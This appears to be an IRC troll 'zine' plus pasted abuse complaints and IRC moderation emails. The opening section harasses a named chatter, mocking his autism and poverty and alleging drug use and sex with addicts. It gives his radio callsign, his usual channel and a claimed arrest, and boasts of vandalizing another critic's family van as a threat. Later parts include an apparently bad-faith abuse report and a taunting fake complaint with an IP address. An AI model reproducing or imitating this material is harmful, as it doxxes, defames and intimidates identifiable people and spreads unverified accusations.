#LRHzine episode 1, the total ruin of the enemy of LRH known as ilken
 
  Yes, hello. This is mtw aka the murder machine here. Let me give you the
backstory. Ilken is an autistic 50yo IRC chatter who lives in a dilapidated
$50k trailer owned by his aging father. He's unable to provide for himself so
his dad pays for his living expenses, phone bill, power, etc. Surprisingly,
the only thing in his name is his internet service. We'll spare releasing his
dox as part of this zine but i assure you they're easy to find as he was
recently arrested in panama city, fl on a military base.
  He likes to spend his time finding ways to buy kratom, pain pills, having
sex with meth addicts, and finding any way he can to put bots on irc without
having to pay for them. He has the lowest level ham radio license and the
cheapest chinese radio you can buy. His callsign is km4qkw and you can find
him in ##hamradio on freenode regularly.
  Lately he took up harassing the lode radio hour show. As other efnet chatters
who fucked with lrh have found out the hard way, you don't fuck with lrh. If
you don't remember, i drove to the house of the last chatter who fucked with
lrh and tagged his dad's van. Let this be a lesson to anyone else...

RE: Abuse
 
encyclopediadramatica.se points to an ip that is provided by you, Cloudflare
 
 There have recently been numerous complaints regarding this organization.
 
 We have recently experienced a large volume of spam email (+50K each time) being sent from this domain.
After further investigation we believe this to be an abusive organization hosting harmful content and involved in extortion, intimidation, spam and are associated with the "GNAA" group and many many other troubling practices.
 
Many of these instances of abuse on IRC networks were spamvertised by a very large botnet.
 
Please forward this report of egregious abuse to the appropriate partie(s) as this issue needs to be be addressed immediately.

 How long have you been using IRC/COM?
Do you REALLY think that your inflammatory actions would deter a suspicious user

I've been on sdf for a very long time using various identities and can assure you there is no malicious intent on my part.Primarily I will use COM rather than IRC due to the confrontational environment that IRC fosters. The channels which you refer to were created on all the networks I am logged on because I had used the /allserv join command. I apologize for any inconvenience that may have caused you or others tasked with protecting the network and additionally wish to make it clear that while my response may have seemed to be belligerent this was not the case it is merely the manner in which I have become accustomed to dealing with disagreements on IRC.
I would of course prefer that the banishment of my homes line address be removed and once more point out that while I do acknowledge the activity appears to be suspicious there was no actual intent or damage to the network or interference with official #channels
 
Thank you for understanding.

Attached is a text file of the suspicious concurrent logins.
Unfortunately I no longer have as old of logs as I used to, due to
reducing my log files in the past. But I have a distinct recollection of
multiple suspicious channels being created from the in 2016 by
concurrent connections of 'CNN', 'FOXNEWS', 'NBCNEWS' and a few others.
In the 2016 instance, which I no longer have in my logs, there was also
mass channel spam involved. Specifically at least one of the connects
joined ever channel on the network and sent the same message.
 
When I attempted to engage you about your activity yesterday, your
response was to tell me off and quit -- as such there was no opportunity
to have a civil conversation. Even now, instead of discussing the matter
you are being belligerent.
 
Would you be willing to have a conversation on why you have so many
concurrent connections to IRC, and why you create so many channels?
Aside for the mass spamming that happen over a year ago, my main concern
is that you created a channel named `#operhelp`, which could be
misleading to a random member if they `/join`ed the channel.

Subject: ABUSE
X-Originating-IP: [99.195.230.68]
 
Yes hello, I would like to lodge a formal complaint of abuse against the operato
rs of the Arstechnica IRCD, specifically the users johnf and sophomore have been
 rude, argumentative, oppositional and aggressive towards me. Its bad enough bei
ng stuck in this wheelchair 24/7 with no visitors but then when people start treating me like a pariah and abusing me on IRC it makes my life a living hell. Sometimes I just wish I had died in Iraq.
Thanks you for your thoughtful consideration in this terrible case of abuse and mistreatment of a disabled person
 
 
 ps I will be filing more complaints of abuse as the situation escalates.
